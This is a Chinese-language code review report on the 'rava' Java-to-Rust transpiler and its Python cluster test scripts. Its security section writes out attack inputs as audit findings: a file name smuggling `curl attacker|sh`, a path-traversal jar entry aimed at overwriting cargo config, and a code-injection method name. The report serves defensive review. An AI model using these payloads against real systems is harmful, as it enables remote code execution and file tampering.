# rava 全方位代码审查报告（2026-10-11）

> 审查方式：主代理摸底后，分派 7 个领域角色子代理并行深度审查（架构、Rust 代码质量、并发与运行时正确性、性能、安全、Python 工具链、测试工程），每条发现均要求亲自核实的 `file:line` 证据；本报告为汇总。审查为只读，未修改任何代码、未运行构建/测试。

## 一、总体结论

**主线（generator 编译器流水线）质量显著高于平均水平，周边系统（集群脚本、安全边界、runtime 生命周期、测试闸门制度化）是当前风险带。**

| 领域 | 评分 | 一句话结论 |
|---|---|---|
| 架构 | 4 / 5 | 分层纪律严格、原则即机器门禁；债在 closure crate 占半（上帝对象）与清单双解析 |
| Rust 代码质量 | 4 / 5 | 非测试代码 unwrap≈0、错误分层一致；债在 method 文本后处理与 emit 公开面失控 |
| 并发与运行时 | 4 / 5 | monitor 双队列与类初始化协议无懈可击；债在监视器/Parker 侧表与对象生命周期脱钩 |
| 性能 | 4 / 5 | 闭包引擎 454s→2.9s 的优化栈文档与代码逐条对得上；runtime 层是新空白区 |
| 安全 | 风险等级：中 | 解析与转义完备、供应链干净；测试名/类名两条"单一收口校验缺失"链可现实利用 |
| Python 工具链 | 3.5 / 5 | 脱钩执行协议与原子写纪律教科书级；一处会写错结果并阻断合入的活跃缺陷 + 双模式漂移 |
| 测试工程 | 3.5 / 5 | golden 方法论与多 oracle 对照罕见地严谨；放行闸门靠自选抽查 + 零 CI 未闭环 |

代码规模：Rust ~14.6 万行（generator 12 crate ~10.9 万 + runtime ~3.4 万）、Python ~1.5 万行、测试 2265 文件（e2e 1110 例 + expected 1114 金标）。

全局量化指标（rg 实测）：`unsafe` 680 处/110 文件（runtime 占 616）；`unwrap/expect` 842 处（非测试代码中生成器侧≈0，见 §3.1）；Python 宽泛 `except` 47 处；`#[cfg(test)]` 文件 198 个、`#[test]` 663 个；TODO/FIXME 全库仅 4 处。

发现总计：**P0 × 1、P1 × 13、P2 × 25、P3 × 18**（各领域去重前 57 条明细见 §3–§9）。

## 二、跨领域主题

**主题 1：单一收口缺失是安全与工具链缺陷的共同根因。** 测试名（=外部语料文件名 stem）无白名单，散落 dist_e2e/_scratch_rm/run_tests 三处裸拼（安全 #1 + Python 工具链同源）；类 binary 名无 JVMS 文法校验，直接进路径 join 与 Rust 标识符（安全 #2/#3）；魔法状态串、`state_jdk{N}` 文件名、`_to_bin_name` 跨模块复制粘贴（Python #8）。同一修法：收口校验 + 常量模块。

**主题 2：「文档承诺」与「工具守护」存在系统性落差。** readability-audit 非零只打印不拦截（架构 #6）；known_failures 的 deferred 无到期复查（测试 #4）；failure_patterns 只增不删（测试 #5）；compatibility.md 统计停在 166 例基线而实际 1110（测试 #9）；README 边界描述、2026-09-13 目标架构未标取代（架构 #4/#5）。凡"终态全 0"类承诺应一律由门禁而非人眼守护。

**主题 3：runtime 的"无 GC + 身份 = 堆地址"模型欠收尾。** 监视器/Parker 侧表按地址索引、永不回收、不持对象引用（并发 #1/#2），地址复用后锁身份与中断状态会串到新对象/新线程——文档自认未完成项，且是普通 Java 程序可触发的路径。

**主题 4：双实现漂移在制造"只修一边"类缺陷。** run_tests.py 顺序/并行两模式（Python #2/#3 均为只改了顺序模式的实证）；closure/input 两套清单解析器（架构 #2）；emit/ty 双份语言锚点常量（架构 #9）；patrol/merge_daemon 各自硬编码 state 文件名。

## 三、最高优先级行动清单（跨领域合并去重）

### 立即（P0）

1. **修租约超时起算**（Python 工具链 #1）：`dist_e2e.py:273`/`dist_job.py:249` 续跑接旧租约仍从原派发时刻起算 → 假 TIMEOUT 失败记录、错误阻断合入；已实际发生（C4 第一轮 6 例），docs 已登记未修。接上时重算 deadline 即可，改动小。

### 高优（P1，建议一周内）

2. **测试名/类名双收口**（安全 #1/#2/#3）：`load_test_list` 与 `import_e2e_corpus` 加 `^[A-Za-z0-9_$]+$` 白名单 + 远端命令一律 `shlex.quote`；binary name 过 `ir::Ident` 级校验 + `Writer::put` 强制 `strip_prefix(out_dir)` 成功才写。关闭"外部语料→集群 RCE"与"恶意 jar→越界写/代码注入"两条链。
3. **闭合监视器/Parker 生命周期**（并发 #1/#2）：MonitorGuard 与 parker 登记持对象强引用，线程终结时复位 ParkState。
4. **合入 TLS lint 修复批次 batch-1010r**（并发 #4）：main 上 `thread_locals_only_in_carrier_slots` 仍红，架构红线门失效。
5. **修 resolve/jdk.rs 错位测试**（Rust #1）：`#[test]` 落在 `#[cfg(test)]` 外编进正常构建 + `set_var` 环境竞态，机械修复。
6. **并行模式对齐顺序模式**（Python #2/#3）：`_run_one` 复用带超时的 `_run_bin`、删除 `_parse_raw` 双重调用（raw 审计指标系统性翻倍）。
7. **「main 既有」变机器基线**（测试 #1）：单测失败建 known_failures 同构基线，merge_daemon 自动比对；抽查名单从提交方自选改为按改动面自动抽取。order 回归跨 5 次合并被"main 既有"放行即实证。
8. **补最小 CI 与统一入口**（测试 #3）：不依赖集群的 10 分钟绿线（cargo test + unittest + e2e 冒烟 + `--deny fallback`）。
9. **runtime 性能三连修**（性能 #3/#4/#5）：`for_class` move 入参串、`RUST_BACKTRACE` OnceLock 化、`DISPATCHERS` 换 `'static str` 键——各一两行、零语义风险。
10. **method 文本后处理加防线**（Rust #2）：`fix_bool_returns`/`normalize_this_clone` 整行子串替换可命中字符串字面量（构造性输入即静默错误输出）；短期加字面量区间防护，中期迁回 IR 层。

### 结构性（P2，规划到迭代）

- closure 收边界：先抽 `handwritten`/`manifest`/`image` 为独立底层 crate，再按 `engine/concrete` 范式折叠 Engine 约 190 个字段（架构 #1/#3）。
- 清单单解析器：三份 TOML schema 与 `IndyKind` 下沉共享，消除"同一数据源、两套语义"（架构 #2）。
- 字符串字面量驻留快路径（性能 #1）：为 `&'static str` 加指针键快表，去掉每次 ldc ~6 次分配 + 全长 SipHash。
- java_runtime 手写层补语义单测（测试 #2）：151 个 .rs 仅 4 个单测，以 compatibility.md §3 近似/未实测条目为清单。
- run_tests.py 拆分启动（Python #7）：S7 既定计划，双模式重复已实证制造"只修一边"缺陷。
- state/summary JSON 解析失败改名备份而非静默重置（Python #4）；SSH 主机密钥弃用 AutoAddPolicy（安全 #4）。
- 文档保鲜：README 边界描述、2026-09-13 目标架构加 superseded、compatibility.md 统计口径、readability 非零升门禁（架构 #4/#5/#6，测试 #9）。

## 四、各领域详细报告

### 4.1 架构审查（评分 4/5）

crate 依赖图（实测各 Cargo.toml）：

```
generator workspace（~109K 行 src，12 crate）          runtime/（无 workspace 根，各自独立）
classfile(2.2K) ←─ zip
ty(5.5K) ──▶ classfile
ir(2.7K) ──▶ (无依赖，全流水线唯一货币)
resolve(1.9K) ─▶ classfile, ty
closure(54.1K) ─▶ classfile, resolve                  rava_macros_core(6.8K, 无依赖)
input(3.3K) ─▶ classfile, resolve, closure, ty          ▲            ▲(plan feature)
cfg(2.3K) ─▶ classfile, ir                            rava_macros    │
sim(1.7K) ─▶ ty, ir                                   (346行壳)      emit ─────────┐
instr(8.9K) ─▶ classfile, ty, ir, sim, input, closure    │             │           │
method(5.9K) ─▶ classfile, ty, ir, sim, cfg, instr, input│             │           │
emit(16.1K) ─▶ classfile,resolve,ty,input,closure,       │             │           ▲
              instr,method,cfg,ir ──── 跨 workspace ─────┼────────────▶┤ rava_macros_core
driver(4.8K) ─▶ classfile,resolve,closure,emit,          │             │ rava_meta_tables
              ir,input,ty ──── 跨 workspace ─────────────┼────────────▶┘ (emit/driver 各引)
                                     java_runtime(23.1K)─┘→ rava_coro(1.3K), libc, parking_lot
```

无循环依赖；跨 workspace 3 条 path 依赖为刻意的单一真源设计（emit 复用 rava_macros_core 的 `plan` feature，手写层与生成层走同一份剥体判定）。

发现清单：

1. **[P1] closure crate 占生成器一半，`Engine` 为上帝对象** — `generator/crates/closure/src/engine.rs:257-692`：closure 54,079 行/全生成器 109,439 行；engine/ 目录平铺 108 个 .rs 模块；`Engine` 结构体约 190 个字段，`impl Engine` 分散 104 处。建议先抽 `handwritten`/`manifest`/`image` 为独立 crate，再以 `engine/concrete` 为范式折叠子上下文。
2. **[P1] runtime 清单双解析器 + 类型重复定义** — `closure/src/manifest.rs:23` 与 `input/src/manifest.rs:21` 对同一份 closure.toml/seeds.toml/vm_intrinsics.toml 各写一套读取，`IndyKind` 两处定义；因依赖方向被迫复制，清单 schema 演进需同步两处、语义分叉是静默错误。建议下沉到 resolve 之下共享。
3. **[P2] 下游翻译阶段反向依赖 closure 的非分析设施** — `instr/src/ctx.rs:98,130`、`emit/src/project/layout.rs:49` 等调用 `closure::handwritten::layout`、`closure::image::*`，closure 事实上的 common crate，加剧不可拆性。
4. **[P2] README 核心思路与 C1d 终态漂移** — README 称"进入 jdk/internal/、sun/ 即停止展开"，而 `runtime/java_runtime/closure.toml:8-10` 已是"JDK 全部按字节码翻译、vm_boundary 只剩 java/lang/Class"。
5. **[P2] 2026-09-13-target-architecture.md 未标取代** — 自称"架构定稿"但三处与现状实质冲突（native_impls 目录、java_runtime 存在性、已删的 Python 实现）。
6. **[P2] readability-audit 仅观测非门禁** — `scripts/run_tests.py:735-751` 只打印非零清单；硬断言只在单测（emit/src/audit.rs:163、driver/tests/build_cli.rs:83）。
7. **[P3] generator 经相对 path 刺入 runtime/（3 条）** — 设计有背书，建议 README 注明理由。
8. **[P3] java_meta→java_runtime 依赖只为固定链接序** — 用编译依赖表达链接顺序，换链接器可能失效。
9. **[P3] 语言锚点常量双份** — `emit/src/lang.rs:4-5` vs `ty/src/consts.rs`，按其自述完成收归。

亮点：三原则全部机器化（可读层五禁形态逐类计数、JDK 字面量 lint 测试、生成树逐字节 golden 对账、`#[jvm_boundary]` 0 使用、expected 树 1114 文件零命中禁用形态）；阶段间进程内结构化直传且冷算双路径逐字节校验；宏分层教科书级；单函数 ≤150 行红线全库仅 7 处超限；109 份 plans 决策与实现抽查一致。

### 4.2 Rust 代码质量审查（评分 4/5）

非测试代码 panic 纪律（剔除一处错位测试后，11 个 generator crate 非测试 `unwrap()` = 0）：expect 集中于"静态正则编译失败"与"已校验存在"两类自证不变量；closure 剩 3 处非测试 unwrap、emit 29 处 expect（12 处 LazyLock 正则）。错误处理统一自定义 enum + Display + Error + 跨层 From；文档注释数超过 pub fn 数（emit 1168/375）。

发现清单：

1. **[P1] 测试函数落在 `#[cfg(test)]` 之外** — `generator/crates/resolve/src/jdk.rs:236-284`：`mod tests` 提前闭合后文件尾又出现顶层 `#[test]`，正常构建把测试体编进库；`unsafe { std::env::set_var("JAVA_HOME", ...) }` 与并行测试竞态、结束 `remove_var` 会吞开发者真实环境。编辑/合并事故，移回 mod tests 即可。
2. **[P2] method 文本后处理管线语义脆弱** — `method/src/postprocess.rs:28-34`：`fix_bool_returns` 对整行 `contains/replace("Ok(1i32)"...)`，Java 字符串字面量 `"Ok(1i32)"` 会被静默改写为 `"Ok(true)"`；`normalize_this_clone`、`fold_array.rs` 同属"渲染成文本再正则改写"架构。建议下沉 IR 构造期。
3. **[P2] emit 公开 API 面失控** — 375 个 bare `pub fn` 中约 180 个 crate 外零引用（`write_mod_tree` 12/0、`stub_call` 13/0 等）；ty 有 28 个同类。建议内部模块 `mod` + 具名 re-export。
4. **[P2] IO 错误字符串化** — `input/src/lib.rs:37-40`、`emit/src/error.rs:8-11`：`Io(String)` 丢失类型化来源，6 个 error 类型均未实现 `source()`；测试大量依赖文案断言。
5. **[P2] rava_coro Drop 路径 expect** — `runtime/rava_coro/src/stack.rs:393,409`：Drop 内 panic 即 abort，运行时库应防御性回退（泄漏槽位+告警）。
6. **[P3] `ir::Ident::new` 不拒绝裸 Rust 关键字** — `ir/src/ident.rs:41-49`，且 `r#` 前缀与 `ty::safe_ident` 的 `_` 后缀两套转义约定并存。
7. **[P3] 线程 spawn 失败直接 panic** — `emit/src/par.rs:46-49`、`input/src/par.rs:39`，资源受限机器上应回退串行。
8. **[P3] DepsLock 前瞻字段 `#[allow(dead_code)]` 占位** — `driver/src/deps_lock.rs:20-30`，sha256 解析校验携带但从不消费。
9. **[P3] dispatch.rs 循环内反复编译正则** — `emit/src/phase2/dispatch.rs:140-146`，同文件已有 `get_or_init` 缓存先例。

亮点：存根策略明确（缺口一律 `panic!("stub: ...")` + precheck 编译前识别）；`CfgError`（可降级）与 `CfgAuditError`（必须中止）语义区分；parse-don't-validate 的 IR；60 行讲清的保序并行执行器（panic 传播 + 线程局部账本回收）。

### 4.3 并发与运行时正确性审查（评分 4/5）

量化：runtime `unsafe` 616 处（java_runtime 528 / rava_coro 41 / rava_macros_core 15），transmute 仅 10 处且成对或带 SAFETY 论证；原子 Ordering Relaxed 50 / SeqCst 36 / Acquire 10 / Release 7；parking_lot 为主，std Mutex `.lock().unwrap()` 残留 9 处。

发现清单：

1. **[P1] 监视器按堆地址惰性挂接、侧表永不回收** — `runtime/java_runtime/src/monitor.rs:466-474`、`obj_ref.rs:343-356`：`monitorenter` 后对象可被释放（合法 Java：`synchronized(o){ o = null; }`），malloc 复用地址后两个不相关对象共享同一把锁——重入误计、伪阻塞、`holdsLock` 误报。`Header::has_monitor` 标着 dead_code 注释自认未接线。建议 MonitorGuard 持对象强引用或实现 drop_slow 摘除。
2. **[P1] Parker 侧表同样无清理** — `monitor.rs:290-297`：已死线程残留的 `interrupted=true` 注入复用地址的新线程——全新线程第一次 sleep 即抛 InterruptedException。建议线程终结簿记时复位 ParkState。
3. **[P2] `Thread.start0` 派生失败后线程对象永久"存活"** — `java/lang/thread_impl.rs:203-210`：失败路径只 note_terminated，eetop/LIVE_THREADS 未回滚，`join()` 挂死（对照 `spawn_vm_system_thread:444-449` 的正确回滚）。
4. **[P2] TLS lint 在 main 上仍失败** — `sync_model.rs:48-64` 的 debug TLS 不在 `thread_local_lint.rs:12` 允许清单；修复在未合入的 batch-1010r（`git merge-base --is-ancestor` 为否）。
5. **[P2] 引用字段 RMW 在持锁状态下调用外来闭包** — `field_desc.rs:111-121`、`array/store.rs:157-165`：soundness 依赖"闭包只比较引用"的约定而非类型，未来 CAS 闭包执行 Java 代码即自旋锁自死锁（release 档静默挂死）。
6. **[P2] 静态字段 RMW 全局锁内调用字段闭包** — `jdk/internal/misc/unsafe__impl.rs:129-149`：防自锁依赖"先触发初始化"的先行约定，无断言保护。
7. **[P2] wait/park 虚假唤醒返回 Ok 依赖调用方循环** — JLS 允许、非缺陷，但与 HotSpot 行为不同，文档标注即可。
8. **[P3] wait 中断时序按 carrier 身份取 key**（虚拟线程挂载期间归属载体）；**[P3]** std Mutex 毒化处理不一致（`into_inner` vs `unwrap`）；**[P3]** `native_memory::fill` 负 bytes 巨型分配（`native_memory.rs:155-162`）；**[P3]** `meta_codec` 解码 panic-on-malformed；**[P3]** debug 持锁登记表容量 16 超限静默降级（`sync_model.rs:52-54`）。

亮点：monitor 双队列（acquire_q/wait_q 分离）严格 JLS §17.2，四处 IllegalMonitorState 检查齐全且顺序与 HotSpot 同；类初始化是无懈可击的双检锁（SeqCst 状态发布 + OWNERS 互斥 + GEN 广播锁、`<clinit>` 不持锁执行、父类/接口先初始化、erroneous→NoClassDefFoundError）；"锁内只克隆、旧值锁外释放"防析构链重入；debug 持锁登记 + track_caller 把 RwLock 自死锁提前成报两处加锁位置；rava_coro 切换防御（double-resume 断言、栈界随上下文迁移、panic 屏障、信号处理器只碰 const TLS）。

### 4.4 性能审查（评分 4/5）

文档 vs 实现对照结论：三份性能 plan 的承诺几乎全部落地（图节点驻留、差分传播、SCC 环合并、集合驻留、上下文摘要共享、P6 缓存命中 24–33ms、emit 并行 + 热写零重写实测）；未完成项与文档自述一致（P5 预算降级无代码、P8 unwrap 清零/engine.rs 拆分进行中）。

发现清单（未标注"实测"的量级为静态推断）：

1. **[P1] 字符串字面量（ldc）路径每次 ~6 次分配 + 全长 SipHash** — `runtime/java_runtime/src/java/lang/string_ext.rs:140` → `string_impl.rs:8-21,67-90`：`to_owned`→UTF-16→LATIN1 双重转换→驻留查询再重建键。建议 `&'static str` 指针键快表 + FxHash。
2. **[P1] closure 冷路径距 ≤2s 目标差 ~0.9s（文档承认暂停）** — sites 727/flows 603/process 757 ms vs 目标 500/400/400；候选清单文档已写明（增量驱动、枢纽免全量重算、惰性读取）。推断 DeepCopy 冷分析 2.9s→~2.3s。
3. **[P2] `Class::for_class` 固定一次多余 `format!` 克隆；`getClass()` 每次两分配** — `class_impl.rs:60`、`object.rs:89-93`。
4. **[P2] VM 异常构造每次 `env::var("RUST_BACKTRACE")`** — `error.rs:36-42`，OnceLock 化。
5. **[P2] 反射分派 String 键 HashMap + 沿父类链逐级字符串查找** — `reflect_dispatch.rs:44-48,86-90`。
6. **[P2] emit 行表汇总 3 趟全量扫描 + 伴生文件串行 I/O** — `emit/src/project/line_tables/mod.rs:364-430`。
7. **[P2] P5 预算降级与 P8 工程化未完成** — 无 `--max-mem`/`degraded` 代码；库代码 unwrap/expect 仍 142 处；engine.rs 692 行 vs 目标 ≤600。
8-12. **[P3]** closure 计时无门槛（`stats.rs:268-281`，≤1–2%）、`numbers_of` clone 后二次查找、`Writer::put` 全量读旧文件比对（换 mtime 保留、可接受）、`text.rs::hex` 逐字节 format!、反射侧 `is_subtype_of` 线性比较。

亮点：闭包引擎是完整多层优化栈（实测 DeepCopy 454s→2.9s/缓存 33ms）；P6 缓存键覆盖分析器二进制+档案+runtime 目录+Input 逐字段，原子写+损坏自愈+LRU；emit 确定性并行（输出与串行逐字节一致）；运行时元数据字符串池+OnceLock+二分；"试过未采用"也有记录。

### 4.5 安全审查（风险等级：中）

威胁模型：①编译不可信 jar/class（供应链）；②Python 脚本处理外部语料文件名并 ssh 到远程测试机。本地开发工具前提下风险为"中"；在声明的不可信语料模型下两条 P1 可现实利用。

发现清单：

1. **[P1] 测试名未引用拼入远端 bash 命令** — `scripts/cluster/dist_e2e.py:115,140-141,176-179` + 根因 `dist_state.py:26`（测试名=文件 stem 无白名单）：名为 `X$(curl attacker|sh);.java` 的语料经 `--filter /{test}.java` 在远程测试机执行。同仓库正确范式已在（`dist_ctx.py:49-52` re.escape+shlex.quote、`remote_run.py` 全链 quote），属个别点漏用。
2. **[P1] 类 binary 名未校验 → 生成文件越界写** — `emit/src/project/layout.rs:19-23,33-34`（`..` 段无过滤）+ `fs.rs:66-78`（写出无围栏）+ `input/build.rs:50-54`（jar 条目名原样收录）：恶意 jar 条目 `a/../../../../tmp/pwn.class` 可覆盖 scratch 外文件（含 `~/.cargo/config.toml` → 进一步 rustc-wrapper RCE）。overlay.rs:164 已有防护模式未复用。
3. **[P2] 标识符净化无字符校验 → 生成 Rust 代码注入** — `ty/src/ident.rs:23-31`（safe_ident 只做 `$`→`_`）；含 `"; fn pwn()...` 的方法名可进入生成源码。`ir::Ident::new` 的严格校验未用于发射路径。
4. **[P2] SSH AutoAddPolicy + 支持明文密码** — `ssh_client.py:47,77`：经 SOCKS 降级代理/内网路径可 MITM。建议 known_hosts + RejectPolicy。
5. **[P3] patrol_status.py shell=True + f-string 模式**（当前字符集 `\w` 不可利用但脆弱）；**[P3]** dist_remote.py 配置值未 quote（`ref.replace("'","")` 黑名单式剥离）；**[P3]** 畸形 class 两处 DoS（`classfile/src/insn.rs:176-180` 先按撒谎长度分配 LookupSwitch、`class.rs:427-446` 注解无深度上限递归）；**[P3]** run_tests.py 本地路径由 stem 派生无校验；**[P3]** `--run-tests-args` 原样追加（文档明示的自担 CLI）。

亮点：字符串字面量转义完备（C0/C1 + 双向文本控制符 + 孤立代理项，覆盖 rustc bidi 攻击面，`ir/src/render/lit.rs:117-132`）；classfile 解析零 panic 路径（抽查 8 处索引/长度点全返回 Err）；remote_run.py 全链 shlex.quote；资源嵌入白名单显式拒绝 `..`；供应链干净（全 registry 依赖、无 [patch]/git 源、集群凭据不入库）。

### 4.6 Python 工具链审查（评分 3.5/5）

量化：13,336 行 Python；宽泛 except 47 处（抽查 8 处，5 处合理兜底、2 处不合理见 #4/#5）；注解率 ~66%；logging 使用 0 处（print 76 个）；tests/unit 1720 行单测覆盖集群核心路径。

发现清单：

1. **[P0] 续跑接旧租约从原派发时刻起算超时 → 假 TIMEOUT 失败记录** — `dist_e2e.py:273`、`dist_job.py:249`；`docs/reference/cluster-testing.md:247-250` 已登记未修，C4 第一轮 6 例实际发生，可能错误阻断合入。
2. **[P1] 并行模式无超时、无信号死亡检测** — `run_tests.py:1075-1080`（`_run_binary` 无 timeout=、无 rc<0 分支、stderr 不落 .run.log），顺序模式 `_run_bin`（1026-1058）三件齐全——挂死测试让 ThreadPoolExecutor 永久挂起。
3. **[P1] `_parse_raw` 双重调用 → [raw] 审计指标系统性翻倍 + 计数器跨线程竞态** — `run_tests.py:1251-1253`（顺序两连调）、`1418`+`1444-1446`（并行两处）；`_RAW_TOTALS['runs']` 也 ×2，收敛 KPI 失真。
4. **[P1] state/summary JSON 解析失败静默吞掉 → 全部进度重置、master 清单被空集覆盖** — `dist_state.py:101-109`（`except: pass` 后以空态继续，`write_master:267-281` 原子覆盖数天累计通过集）；`dist_job.py:79` JobBoard 裸 json.loads。
5. **[P2] 分发器永远退出 0** — `distribute_tests.py:383-392`（future 异常从不 `.result()`）、`:250`（run_jobs 返回值丢弃）。
6. **[P2] `--cleanup-servers` 忽略 `--servers` 过滤且 rm -rf 不读退出码** — `distribute_tests.py:153-164`：会连其他服务器的 REMOTE_DIR 一起删。
7. **[P2] run_tests.py 1789 行职责过载 + 双模式 ~30 行逐字重复** — `_run_sequential` 与 `_run_parallel` 同构块、`_discover` 一次跑批发现两遍、模块级可变全局 ~10 个。
8. **[P2] 魔法状态串/文件名散落跨模块复制** — patrol_status.py:124 与 merge_daemon.py:125 各自硬编码 `state_jdk21.json`（--jdk 25 时静默失明）；`_to_bin_name` 双实现；作业状态名漂移。
9. **[P2] 无日志框架 + run_bg.sh 恒返回 0** — `run_bg.sh:20-21` 记录码但自身退出 0。
10. **[P3] `_PassedRatchet` 复制时连 `_load_failed` 一起搬**（run_tests.py:492-510）；**[P3]** shell 作业脚本 `set -uo pipefail` 不带 `-e` + `eval` 切分参数；**[P3]** ssh run_command 不返回 exit_status 等不一致防护。

亮点：remote_run.py 脱钩执行协议教科书级（原子 rc/done 标记、偏移续读、断线不重派、`RAVA_DIST_INJECT_DROP` 注入自测、按物理机熔断冷却）；持久化全 tmp+os.replace 原子写、棘轮 flock 内重读-合并；两级 cgroup 内存上限且主动验证 MemoryMax 生效；模块头 docstring 即架构文档。

### 4.7 测试工程审查（评分 3.5/5）

量化：e2e 1110 例/73 语义目录（expected 1114 文件严格 1:1）；generator 12 crate 共 618 个 `#[test]` 无零测 crate（closure 243/emit 90/driver 73）；runtime 仅 45 个（java_runtime 151 个 .rs 仅 4 个）；tests/unit 110 个测试全部测基建；known_failures 8 条（7 deferred）、failure_patterns 92 条（76 fixed，全部 2026-10-10 单日回溯登记）。

发现清单：

1. **[P1] 合入闸门 = 提交方自选抽查名单（0.5%–5% 抽样）+ 单测已知失败仅口头基线** — `merge_queue.py` tests 字段由提交方填写；`order` 单测回归跨 5 次合并（1010l→1010q）均以"main 既有"放行直至 1010r 才修；known_failures schema 只有 e2e 条目，无单测基线。
2. **[P1] java_runtime 手写层 151 个 .rs 仅 4 个单测** — CLAUDE.md 明示手写层以 e2e 重跑为唯一验证；compatibility.md §3 的近似等价条目（identity-hash、finalize、弱引用）无第二层网。
3. **[P1] 仓库零 CI** — 无 .github/gitlab-ci/pre-commit/Makefile；2265 文件的执行完全绑在自建集群 + 人工入口（CLAUDE.md 手工命令清单）。
4. **[P2] known_failures deferred 无到期复查机制** — 无 review_by/recheck 字段，阶段延期即无限滞留（当前仅 8 条治理良好，是制度缺口非现状问题）。
5. **[P2] failure_patterns 只增不删 + 单日 92 条回溯登记** — 子串匹配假命中文档自认；无周期复核。
6. **[P2] 测试二进制继承运行进程 CWD + 数据文件混入 expected 金标树** — `_run_bin` 未设 cwd；StockTrans.java 等依赖"CWD=仓库根"隐含约定。
7. **[P2] run_tests.py 1789 行仅 3 个单测**（且只测 dist_e2e 参数透传）；棘轮合并、批切分、审计解析全无单测。
8. **[P2] 性能无合入闸门** — closure_bench/emit_bench 设施齐备但不在任何 gate 内；transpile-time 回归已实际发生（failure_patterns 3 条性能类条目均为事后登记）。
9. **[P3] compatibility.md 统计口径过期**（166 例基线 vs 实际 1110）；**[P3]** tests/compare 为退役工作流死文件。

亮点：golden 方法论逐位可复现（参考 JDK 钉死、禁 HotSpot 数学内建回退 fdlibm、固定 locale/TZ、语料确定性入场券规则；1110 金标中含身份哈希输出的 0 个）；顺序无关性/哈希种子无关性是一等测试资产（closure_cli 全矩阵对照 + 规范化 JSON）；多 oracle 对照（JVMTI 动态类加载轨迹 vs 静态闭包双向印证 + 12 类归因）；known_failures 治理克制（OOM/超时永不算已知）；语料膨胀有查重工具且裁决保守。

## 五、附录：审查方法与局限

- 各子代理独立工作，发现存在少量交叉验证（如安全 #1 与 Python #8 同根、性能 #7 与 Rust #1 的 unwrap 计数口径一致）。
- 全部为静态审查：未运行构建、测试、benchmark；"实测"字样的数字均引自仓库内文档（性能 plans、failure_patterns）。
- unsafe 680 处中 runtime 616 处由并发代理抽查高风险面（transmute/裸指针/from_raw 全量过目），generator 侧由安全代理抽查，非逐行形式化验证。
- tests/e2e 1110 例为抽样审查，未逐例核对 expected 内容。
